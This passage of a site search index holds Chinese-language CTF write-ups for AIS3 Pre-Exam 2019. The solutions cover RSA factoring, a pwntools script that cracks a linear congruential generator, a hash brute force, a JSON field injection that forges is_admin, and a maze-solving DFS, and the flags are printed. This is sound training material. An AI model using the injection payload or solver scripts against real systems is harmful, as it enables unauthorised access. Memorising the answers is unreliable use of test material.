\u9996\u5148\u56e0\u70ba\u9918\u6578\u5fc5\u5b9a\u5927\u65bc\u7b49\u65bc 0 \uff0c\u6240\u4ee5\u6709\uff1a $$ (p-1)\\equiv0\\pmod{r} $$ $$ (r^5-1)\\equiv0\\pmod{p} $$ 1$^o$ \u8003\u616e\u5f0f1\uff1a \u53ef\u4ee5\u77e5\u9053$\\ p>r$ 2$^o$ \u8003\u616e\u5f0f2\uff1a $$ (r-1)(r^4+r^3+r^2+r^1+1)=(r^5-1)\\equiv0\\pmod{p} $$ $$ \\Rightarrow(r-1)\\equiv0\\pmod{p}\\lor(r^4+r^3+r^2+r^1+1)\\equiv0\\pmod{p} $$ \u6839\u64da 1$^o$ \uff0c$(r-1)\\equiv0\\pmod{p}\\ $\u4e0d\u6210\u7acb\uff0c\u56e0\u6b64$(r^4+r^3+r^2+r^1+1)\\equiv0\\pmod{p}\\ $\u5fc5\u7136\u6210\u7acb \u4e0d\u59a8\u5047\u8a2d$\\ (r^4+r^3+r^2+r^1+1)={k}\\times{p}$ \u8a08\u7b97$R=r^4+r^3+r^2+r^1+1$\uff0c\u70ba\u4e00\u500b362\u4f4d\u6578\u3002\u628a\u5b83\u62ff\u53bb\u505a\u8cea\u56e0\u6578\u5206\u89e3\uff0c\u767c\u73fe\u662f\u500b\u8cea\u6578\u3002 \u4e5f\u5c31\u662f\u8aaa$\\ k=1\\ $\u4e14$\\ p=R\\ $\u3002 \u5f97\u5230$\\ p\\ $\uff0c\u6240\u4ee5$\\ q=n_2/p\\ $\uff0c\u9700\u8981\u7684\u6578\u5b57\u90fd\u5f97\u5230\u4e86\u3002 \u63a5\u4e0b\u4f86\u662f\u958b\u5fc3\u7684RSA\u89e3\u78bc\u6642\u9593\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 def egcd ( a , b ): # \u64f4\u5c55\u6b50\u5e7e\u91cc\u5f97\u6f14\u7b97\u6cd5 if a == 0 : return ( b , 0 , 1 ) else : g , y , x = egcd ( b % a , a ) return ( g , x - ( b // a ) * y , y ) def modinv ( a , m ): g , x , y = egcd ( a , m ) if g != 1 : raise Exception ( 'modular inverse does not exist' ) else : return x % m phi = ( p - 1 ) * ( q - 1 ) d = modinv ( e , phi ) plain = pow ( enc , d , n ) print ( binascii . unhexlify ( hex ( plain )[ 2 :]) . decode ( 'utf-8' )) \u628a enc1 , enc2 \u89e3\u78bc\u4e4b\u5f8c\u5408\u4f75\u5c31\u5f97\u5230flag\u4e86","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Crypto/RSA202/#flag","text":"AIS3{S0me7im3s_I_h4tE_factorDB} \u628a\u5169\u767e\u591a\u7d44n2\u4e1f\u5230factordb\u90fd\u6c92\u4e2dQQ","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Crypto/RandomGuess/","text":"Random Guess Question \u6c92\u5099\u4efd\u5230QQ Write-up \u984c\u76ee\u5927\u6982\u9577\u9019\u6a23\uff1a 1 2 3 4 Random number a,b,c : Given the set of number Ni+1 = (a * Ni + b) % c N = 382610523, 871508922, 429815693, 269882023, 764320304, 457647013, 823621974, 325323277, 251510795, 905375048 If you can guess the next 100 numbers to me (one by one), and I will give you the flag A___A+ \u6211\u4e5f\u4e0d\u6703\uff0c\u7e3d\u4e4b\u5148\u628a\u7a0b\u5f0f\u78bc\u653e\u9019\u88e1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 # -*- coding: UTF-8 -*- #!/usr/bin/env python import math import functools from fractions import gcd from pwn import * def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , x , y = egcd ( b % a , a ) return ( g , y - ( b // a ) * x , x ) def modinv ( b , n ): g , x , _ = egcd ( b , n ) if g == 1 : return x % n def crack_unknown_increment ( states , modulus , multiplier ): increment = ( states [ 1 ] - states [ 0 ] * multiplier ) % modulus return multiplier , increment , modulus def crack_unknown_multiplier ( states , modulus ): multiplier = ( states [ 2 ] - states [ 1 ]) * modinv ( states [ 1 ] - states [ 0 ], modulus ) % modulus return crack_unknown_increment ( states , modulus , multiplier ) def crack_unknown_modulus ( states ): diffs = [ s1 - s0 for s0 , s1 in zip ( states , states [ 1 :])] zeroes = [ t2 * t0 - t1 * t1 for t0 , t1 , t2 in zip ( diffs , diffs [ 1 :], diffs [ 2 :])] modulus = abs ( reduce ( gcd , zeroes )) return crack_unknown_multiplier ( states , modulus ) host = \"pre-exam-chals.ais3.org\" port = 10200 sh = remote ( host , port ) data = sh . readlines ( 3 ) d = data [ - 1 ] . split ( ', ' )[ 1 :] for i in range ( len ( d )): d [ i ] = int ( d [ i ]) print ( d ) a , b , c = crack_unknown_modulus ( d ) # [369756028, 443486561, 209630204, 400780967, 319354870, 434791958, 355323500, 596018126, 161603907] print ( a , b , c ) n = d [ - 1 ] nextN = ( a * n + b ) % c print ( 0 , nextN ) sh . sendlineafter ( \"A___A+ \\n \" , str ( nextN )) for i in range ( 99 ): nextN = ( a * nextN + b ) % c print ( i + 1 , nextN ) sh . sendlineafter ( \"Good! \\n \" , str ( nextN )) # n = nextN # sh.interactive() sh . interactive () Flag AIS3{GGEZ!!LiNe42_COngRuen7i4l_6eNErATor}","title":"Random Guess"},{"location":"CTF/AIS3PreExam2019/Crypto/RandomGuess/#random-guess","text":"","title":"Random Guess"},{"location":"CTF/AIS3PreExam2019/Crypto/RandomGuess/#question","text":"\u6c92\u5099\u4efd\u5230QQ","title":"Question"},{"location":"CTF/AIS3PreExam2019/Crypto/RandomGuess/#write-up","text":"\u984c\u76ee\u5927\u6982\u9577\u9019\u6a23\uff1a 1 2 3 4 Random number a,b,c : Given the set of number Ni+1 = (a * Ni + b) % c N = 382610523, 871508922, 429815693, 269882023, 764320304, 457647013, 823621974, 325323277, 251510795, 905375048 If you can guess the next 100 numbers to me (one by one), and I will give you the flag A___A+ \u6211\u4e5f\u4e0d\u6703\uff0c\u7e3d\u4e4b\u5148\u628a\u7a0b\u5f0f\u78bc\u653e\u9019\u88e1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 # -*- coding: UTF-8 -*- #!/usr/bin/env python import math import functools from fractions import gcd from pwn import * def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , x , y = egcd ( b % a , a ) return ( g , y - ( b // a ) * x , x ) def modinv ( b , n ): g , x , _ = egcd ( b , n ) if g == 1 : return x % n def crack_unknown_increment ( states , modulus , multiplier ): increment = ( states [ 1 ] - states [ 0 ] * multiplier ) % modulus return multiplier , increment , modulus def crack_unknown_multiplier ( states , modulus ): multiplier = ( states [ 2 ] - states [ 1 ]) * modinv ( states [ 1 ] - states [ 0 ], modulus ) % modulus return crack_unknown_increment ( states , modulus , multiplier ) def crack_unknown_modulus ( states ): diffs = [ s1 - s0 for s0 , s1 in zip ( states , states [ 1 :])] zeroes = [ t2 * t0 - t1 * t1 for t0 , t1 , t2 in zip ( diffs , diffs [ 1 :], diffs [ 2 :])] modulus = abs ( reduce ( gcd , zeroes )) return crack_unknown_multiplier ( states , modulus ) host = \"pre-exam-chals.ais3.org\" port = 10200 sh = remote ( host , port ) data = sh . readlines ( 3 ) d = data [ - 1 ] . split ( ', ' )[ 1 :] for i in range ( len ( d )): d [ i ] = int ( d [ i ]) print ( d ) a , b , c = crack_unknown_modulus ( d ) # [369756028, 443486561, 209630204, 400780967, 319354870, 434791958, 355323500, 596018126, 161603907] print ( a , b , c ) n = d [ - 1 ] nextN = ( a * n + b ) % c print ( 0 , nextN ) sh . sendlineafter ( \"A___A+ \\n \" , str ( nextN )) for i in range ( 99 ): nextN = ( a * nextN + b ) % c print ( i + 1 , nextN ) sh . sendlineafter ( \"Good! \\n \" , str ( nextN )) # n = nextN # sh.interactive() sh . interactive ()","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Crypto/RandomGuess/#flag","text":"AIS3{GGEZ!!LiNe42_COngRuen7i4l_6eNErATor}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Crypto/TCash/","text":"TCash Question T? Cat? Hash? 1 2 3 4 5 6 7 8 9 10 11 12 13 from hashlib import md5 , sha256 from secret import FLAG cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@,- _{}' md5s = [] sha256s = [] for f in FLAG : assert f in cand md5s . append ( int ( md5 ( f . encode ()) . hexdigest (), 16 ) % 64 ) sha256s . append ( int ( sha256 ( f . encode ()) . hexdigest (), 16 ) % 64 ) # md5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15] # sha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18] Write-up \u66b4\u529b\u7834\u89e3\u5c31\u80fd\u9006\u63a8\u56deflag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from hashlib import md5 , sha256 cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _{}' md5s = [ 41 , 63 , 46 , 51 , 6 , 26 , 42 , 50 , 44 , 33 , 29 , 50 , 27 , 28 , 30 , 17 , 31 , 19 , 46 , 50 , 33 , 45 , 26 , 26 , 29 , 31 , 52 , 33 , 1 , 45 , 31 , 22 , 50 , 50 , 50 , 50 , 50 , 31 , 22 , 50 , 44 , 26 , 44 , 49 , 50 , 49 , 26 , 45 , 31 , 30 , 22 , 44 , 30 , 31 , 17 , 50 , 50 , 50 , 31 , 43 , 52 , 50 , 53 , 31 , 30 , 17 , 26 , 31 , 46 , 41 , 44 , 26 , 31 , 52 , 50 , 30 , 31 , 26 , 39 , 31 , 46 , 33 , 27 , 1 , 42 , 50 , 31 , 30 , 12 , 26 , 27 , 52 , 31 , 30 , 12 , 31 , 46 , 26 , 27 , 14 , 50 , 31 , 22 , 52 , 33 , 31 , 41 , 50 , 46 , 31 , 22 , 23 , 41 , 31 , 53 , 26 , 21 , 31 , 33 , 30 , 31 , 19 , 39 , 51 , 33 , 30 , 39 , 51 , 12 , 58 , 60 , 31 , 41 , 33 , 53 , 31 , 3 , 17 , 50 , 31 , 51 , 26 , 29 , 52 , 31 , 33 , 22 , 26 , 31 , 41 , 51 , 54 , 41 , 29 , 52 , 31 , 19 , 23 , 33 , 30 , 44 , 26 , 27 , 38 , 8 , 50 , 29 , 15 ] sha256s = [ 61 , 44 , 3 , 14 , 22 , 41 , 43 , 30 , 49 , 59 , 58 , 30 , 11 , 3 , 24 , 35 , 40 , 46 , 3 , 42 , 59 , 36 , 41 , 41 , 41 , 40 , 9 , 59 , 23 , 36 , 40 , 33 , 42 , 42 , 42 , 42 , 42 , 40 , 44 , 42 , 49 , 24 , 49 , 28 , 42 , 33 , 24 , 36 , 40 , 24 , 33 , 10 , 24 , 40 , 35 , 42 , 42 , 42 , 40 , 39 , 9 , 42 , 3 , 40 , 24 , 35 , 24 , 40 , 3 , 61 , 49 , 24 , 40 , 9 , 42 , 24 , 40 , 41 , 17 , 40 , 12 , 57 , 11 , 23 , 43 , 42 , 40 , 24 , 18 , 41 , 11 , 9 , 40 , 24 , 18 , 40 , 3 , 41 , 11 , 12 , 42 , 40 , 44 , 9 , 59 , 40 , 61 , 42 , 3 , 40 , 44 , 13 , 61 , 40 , 3 , 24 , 29 , 40 , 59 , 24 , 40 , 19 , 18 , 6 , 59 , 24 , 18 , 6 , 22 , 0 , 39 , 40 , 61 , 57 , 3 , 40 , 17 , 35 , 42 , 40 , 58 , 24 , 58 , 9 , 40 , 59 , 44 , 24 , 40 , 61 , 48 , 52 , 61 , 58 , 9 , 40 , 19 , 13 , 59 , 24 , 53 , 41 , 11 , 55 , 55 , 42 , 58 , 18 ] ans = [] for i in range ( len ( md5s )): for c in cand : tm = int ( md5 ( c . encode ()) . hexdigest (), 16 ) % 64 ts = int ( sha256 ( c . encode ()) . hexdigest (), 16 ) % 64 if tm == md5s [ i ] and ts == sha256s [ i ]: print ( c , end = '' ) break Flag AIS3{0N_May_16th @Sead00g said Heeeee ReMEMBerEd tH4t heee UseD thE SAME set 0f On1iNe to01s to S01Ve Rsa AeS RCA DE5 at T-cat-cup, AnD 7he kEys aRE AlWAys TCat2019Key}","title":"TCash"},{"location":"CTF/AIS3PreExam2019/Crypto/TCash/#tcash","text":"","title":"TCash"},{"location":"CTF/AIS3PreExam2019/Crypto/TCash/#question","text":"T? Cat? Hash? 1 2 3 4 5 6 7 8 9 10 11 12 13 from hashlib import md5 , sha256 from secret import FLAG cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@,- _{}' md5s = [] sha256s = [] for f in FLAG : assert f in cand md5s . append ( int ( md5 ( f . encode ()) . hexdigest (), 16 ) % 64 ) sha256s . append ( int ( sha256 ( f . encode ()) . hexdigest (), 16 ) % 64 ) # md5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15] # sha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]","title":"Question"},{"location":"CTF/AIS3PreExam2019/Crypto/TCash/#write-up","text":"\u66b4\u529b\u7834\u89e3\u5c31\u80fd\u9006\u63a8\u56deflag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from hashlib import md5 , sha256 cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _{}' md5s = [ 41 , 63 , 46 , 51 , 6 , 26 , 42 , 50 , 44 , 33 , 29 , 50 , 27 , 28 , 30 , 17 , 31 , 19 , 46 , 50 , 33 , 45 , 26 , 26 , 29 , 31 , 52 , 33 , 1 , 45 , 31 , 22 , 50 , 50 , 50 , 50 , 50 , 31 , 22 , 50 , 44 , 26 , 44 , 49 , 50 , 49 , 26 , 45 , 31 , 30 , 22 , 44 , 30 , 31 , 17 , 50 , 50 , 50 , 31 , 43 , 52 , 50 , 53 , 31 , 30 , 17 , 26 , 31 , 46 , 41 , 44 , 26 , 31 , 52 , 50 , 30 , 31 , 26 , 39 , 31 , 46 , 33 , 27 , 1 , 42 , 50 , 31 , 30 , 12 , 26 , 27 , 52 , 31 , 30 , 12 , 31 , 46 , 26 , 27 , 14 , 50 , 31 , 22 , 52 , 33 , 31 , 41 , 50 , 46 , 31 , 22 , 23 , 41 , 31 , 53 , 26 , 21 , 31 , 33 , 30 , 31 , 19 , 39 , 51 , 33 , 30 , 39 , 51 , 12 , 58 , 60 , 31 , 41 , 33 , 53 , 31 , 3 , 17 , 50 , 31 , 51 , 26 , 29 , 52 , 31 , 33 , 22 , 26 , 31 , 41 , 51 , 54 , 41 , 29 , 52 , 31 , 19 , 23 , 33 , 30 , 44 , 26 , 27 , 38 , 8 , 50 , 29 , 15 ] sha256s = [ 61 , 44 , 3 , 14 , 22 , 41 , 43 , 30 , 49 , 59 , 58 , 30 , 11 , 3 , 24 , 35 , 40 , 46 , 3 , 42 , 59 , 36 , 41 , 41 , 41 , 40 , 9 , 59 , 23 , 36 , 40 , 33 , 42 , 42 , 42 , 42 , 42 , 40 , 44 , 42 , 49 , 24 , 49 , 28 , 42 , 33 , 24 , 36 , 40 , 24 , 33 , 10 , 24 , 40 , 35 , 42 , 42 , 42 , 40 , 39 , 9 , 42 , 3 , 40 , 24 , 35 , 24 , 40 , 3 , 61 , 49 , 24 , 40 , 9 , 42 , 24 , 40 , 41 , 17 , 40 , 12 , 57 , 11 , 23 , 43 , 42 , 40 , 24 , 18 , 41 , 11 , 9 , 40 , 24 , 18 , 40 , 3 , 41 , 11 , 12 , 42 , 40 , 44 , 9 , 59 , 40 , 61 , 42 , 3 , 40 , 44 , 13 , 61 , 40 , 3 , 24 , 29 , 40 , 59 , 24 , 40 , 19 , 18 , 6 , 59 , 24 , 18 , 6 , 22 , 0 , 39 , 40 , 61 , 57 , 3 , 40 , 17 , 35 , 42 , 40 , 58 , 24 , 58 , 9 , 40 , 59 , 44 , 24 , 40 , 61 , 48 , 52 , 61 , 58 , 9 , 40 , 19 , 13 , 59 , 24 , 53 , 41 , 11 , 55 , 55 , 42 , 58 , 18 ] ans = [] for i in range ( len ( md5s )): for c in cand : tm = int ( md5 ( c . encode ()) . hexdigest (), 16 ) % 64 ts = int ( sha256 ( c . encode ()) . hexdigest (), 16 ) % 64 if tm == md5s [ i ] and ts == sha256s [ i ]: print ( c , end = '' ) break","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Crypto/TCash/#flag","text":"AIS3{0N_May_16th @Sead00g said Heeeee ReMEMBerEd tH4t heee UseD thE SAME set 0f On1iNe to01s to S01Ve Rsa AeS RCA DE5 at T-cat-cup, AnD 7he kEys aRE AlWAys TCat2019Key}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Misc/AreYouAdmin/","text":"Are You Admin? Question nc pre-exam-chals.ais3.org 10203 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #!/usr/bin/ruby require 'json' STDOUT . sync = true puts \"Your name:\" name = STDIN . gets . chomp puts \"Your age:\" age = STDIN . gets . chomp if age . match ( /[[:alpha:]]/ ) puts \"No!No!No!\" exit end string = \"{ \\\" name \\\" : \\\" #{ name } \\\" , \\\" is_admin \\\" : \\\" no \\\" , \\\" age \\\" : \\\" #{ age } \\\" }\" res = JSON . parse ( string ) puts res if res [ 'is_admin' ] == \"yes\" puts \"AIS3{xxxxxxxxxxxx}\" # flag is here else puts \"Hello, \" + res [ 'name' ] puts \"You are not admin :(\" end Write-up \u89c0\u5bdf 1 2 string = \"{ \\\" name \\\" : \\\" #{ name } \\\" , \\\" is_admin \\\" : \\\" no \\\" , \\\" age \\\" : \\\" #{ age } \\\" }\" res = JSON . parse ( string ) \u8ddf 1 2 if res [ 'is_admin' ] == \"yes\" puts \"AIS3{xxxxxxxxxxxx}\" # flag is here \u5169\u90e8\u5206\u53ef\u4ee5\u77e5\u9053\u8981\u8b93\u60f3\u8fa6\u6cd5\u8b93 res[\"is_admin\"] \u8b8a\u6210 \"yes\" \u3002 \u6709\u9edesql injection\u7684\u611f\u89ba\uff08\uff1f name \u8f38\u5165 YABASU\", \"is_admin\":\"yes\", \"A\": { \"B\":\"C age \u8f38\u5165 1\", \"2\": \"3\"}, \"4\": \"5 \u9019\u6a23 string \u5c31\u6703\u8b8a\u6210 {\"name\":\"YABASU\", \"is_admin\":\"yes\", \"A\": { \"B\":\"C\",\"is_admin\":\"no\", \"age\":\"1\", \"2\": \"3\"}, \"4\": \"5\"} \u8f49\u6210 JSON \u683c\u5f0f\u4e4b\u5f8c\uff1a 1 2 3 4 5 6 7 8 9 10 11 res = { \"4\" : \"5\" , \"name\" : \"YABASU\" , \"is_admin\" : \"yes\" , \"A\" : { \"2\" : \"3\" , \"B\" : \"C\" , \"is_admin\" : \"no\" , \"age\" : \"1\" } } \u76ee\u6a19\u9054\u6210\uff0c\u5f97\u5230flag \u5982\u679c\u4e0d\u4f7f\u7528 { , } \u628a \"is_admin\": \"no\" \u8655\u7406\uff08\uff1f\u6389\uff0c\u5b83\u6703\u8986\u84cb\u524d\u9762\u7684 \"is_admin\": \"yes\" Flag AIS3{RuBy_js0n_i5_s0_w3ird_0_o}","title":"Are You Admin?"},{"location":"CTF/AIS3PreExam2019/Misc/AreYouAdmin/#are-you-admin","text":"","title":"Are You Admin?"},{"location":"CTF/AIS3PreExam2019/Misc/AreYouAdmin/#question","text":"nc pre-exam-chals.ais3.org 10203 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #!/usr/bin/ruby require 'json' STDOUT . sync = true puts \"Your name:\" name = STDIN . gets . chomp puts \"Your age:\" age = STDIN . gets . chomp if age . match ( /[[:alpha:]]/ ) puts \"No!No!No!\" exit end string = \"{ \\\" name \\\" : \\\" #{ name } \\\" , \\\" is_admin \\\" : \\\" no \\\" , \\\" age \\\" : \\\" #{ age } \\\" }\" res = JSON . parse ( string ) puts res if res [ 'is_admin' ] == \"yes\" puts \"AIS3{xxxxxxxxxxxx}\" # flag is here else puts \"Hello, \" + res [ 'name' ] puts \"You are not admin :(\" end","title":"Question"},{"location":"CTF/AIS3PreExam2019/Misc/AreYouAdmin/#write-up","text":"\u89c0\u5bdf 1 2 string = \"{ \\\" name \\\" : \\\" #{ name } \\\" , \\\" is_admin \\\" : \\\" no \\\" , \\\" age \\\" : \\\" #{ age } \\\" }\" res = JSON . parse ( string ) \u8ddf 1 2 if res [ 'is_admin' ] == \"yes\" puts \"AIS3{xxxxxxxxxxxx}\" # flag is here \u5169\u90e8\u5206\u53ef\u4ee5\u77e5\u9053\u8981\u8b93\u60f3\u8fa6\u6cd5\u8b93 res[\"is_admin\"] \u8b8a\u6210 \"yes\" \u3002 \u6709\u9edesql injection\u7684\u611f\u89ba\uff08\uff1f name \u8f38\u5165 YABASU\", \"is_admin\":\"yes\", \"A\": { \"B\":\"C age \u8f38\u5165 1\", \"2\": \"3\"}, \"4\": \"5 \u9019\u6a23 string \u5c31\u6703\u8b8a\u6210 {\"name\":\"YABASU\", \"is_admin\":\"yes\", \"A\": { \"B\":\"C\",\"is_admin\":\"no\", \"age\":\"1\", \"2\": \"3\"}, \"4\": \"5\"} \u8f49\u6210 JSON \u683c\u5f0f\u4e4b\u5f8c\uff1a 1 2 3 4 5 6 7 8 9 10 11 res = { \"4\" : \"5\" , \"name\" : \"YABASU\" , \"is_admin\" : \"yes\" , \"A\" : { \"2\" : \"3\" , \"B\" : \"C\" , \"is_admin\" : \"no\" , \"age\" : \"1\" } } \u76ee\u6a19\u9054\u6210\uff0c\u5f97\u5230flag \u5982\u679c\u4e0d\u4f7f\u7528 { , } \u628a \"is_admin\": \"no\" \u8655\u7406\uff08\uff1f\u6389\uff0c\u5b83\u6703\u8986\u84cb\u524d\u9762\u7684 \"is_admin\": \"yes\"","title":"Write-up"},{"location":"CTF/AIS3PreExam2019/Misc/AreYouAdmin/#flag","text":"AIS3{RuBy_js0n_i5_s0_w3ird_0_o}","title":"Flag"},{"location":"CTF/AIS3PreExam2019/Misc/CrystalMaze/","text":"Crystal Maze Question nc pre-exam-chals.ais3.org 10202 Write-up \u662f\u500b\u8d70\u8ff7\u5bae\u5c0f\u904a\u6232\uff0c\u9023\u7dda\u4e4b\u5f8c\u6703\u770b\u5230\u4ee5\u4e0b\u8a0a\u606f\uff1a 1 2 3 Bonjour. You're in a 16x16 crystal maze. To take a step, enter \"up\", \"down\", \"left\", or \"right\". move: \u8f38\u5165\u60f3\u8981\u524d\u9032\u7684\u65b9\u5411\uff0c\u5982\u679c\u649e\u5230\u7246\u58c1\u6703\u56de\u50b3 wall \uff0c\u5426\u5247\u662f ok \uff0c\u91cd\u8907\u8f38\u5165\u76f4\u5230\u627e\u5230\u7d42\u9ede\u3002 \u53e6\u5916\u9019\u984c\u6709\u6642\u9593\u9650\u5236\uff0c\u5927\u69822~3\u79d2\u5de6\u53f3\u5c31\u6703\u81ea\u52d5\u65b7\u7dda\u3002 \u4f7f\u7528 pwntools \u5e6b\u5fd9\u8f38\u5165\uff0c\u518d\u7528 DFS \u904d\u6b77\u8ff7\u5bae\uff0c\u6210\u529f\u627e\u5230flag\uff0c\u7a0b\u5f0f\u78bc\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 # -*- coding: UTF-8 -*- #!/usr/bin/env python from pwn import * host = \"pre-exam-chals.ais3.org\" port = 10202 p = [] direct = [ \"up\" , \"down\" , \"left\" , \"right\" ] def main (): dfs ( 3 , 0 ) # \u5df2\u7d93\u77e5\u9053\u7b2c\u4e00\u6b65\u53ea\u80fd\u5411\u53f3\u8d70 def dfs ( dir = 0 , depth = 0 ): global p if len ( p ) > 0 : p = p [ 0 : depth ] # \u4e0d\u80fd\u5f80\u56de\u8d70 if p [ - 1 ] == \"up\" and direct [ dir ] == \"down\" : return elif p [ - 1 ] == \"down\" and direct [ dir ] == \"up\" : return elif p [ - 1 ] == \"left\" and direct [ dir ] == \"right\" : return elif p [ - 1 ] == \"right\" and direct [ dir ] == \"left\" : return # \u5efa\u7acb\u9023\u7dda sh = remote ( host , port ) # \u8d70\u904e\u5df2\u7d93\u77e5\u9053\u7684\u8def if len ( p ) > 0 : for pa in p : sh . sendlineafter ( \"move: \" , pa ) # \u518d\u8d70\u4e00\u6b65 sh . sendlineafter ( \"move: \" , direct [ dir ]) ret = sh . readline () if ret == \"ok \\n \" : # \u6709\u8def\uff01 p . append ( direct [ dir ]) # \u7d00\u9304\u5230\u8def\u5f91\u4e2d # print(p) for i in range ( 4 ): # \u56db\u500b\u65b9\u5411\u90fd\u8d70\u8d70\u770b dfs ( i , depth + 1 ) elif ret == \"wall \\n \" : # \u649e\u5230\u7246 return else : # \u90fd\u4e0d\u662f -> \u627e\u5230flag\u4e86 print ( \"FLAG\" , ret ) sh . interactive () return sh . close () if __name__ == \"__main__\" : main () Note \u70ba\u6c42\u65b9\u4fbf\uff0c\u4e0a\u65b9\u7a0b\u5f0f\u78bc\u6c92\u6709\u8655\u7406\u8ff4\u5708\u60c5\u6cc1\u3002 \u82e5\u8981\u66f4\u5b8c\u5099\uff0c\u9700\u8981\u70ba\u8d70\u904e\u7684\u5ea7\u6a19\uff08\u63a1\u7528\u4e8c\u7dad\u9663\u5217\u7d00\u9304\u76f8\u5c0d\u5ea7\u6a19\uff09\u5857\u984f\u8272\uff08\u767d\u3001\u7070\u8ddf\u9ed1\uff09\uff0c\u8d70\u5230\u7070\u8272\u9ede\u5373\u8868\u793a\u627e\u5230 back edge 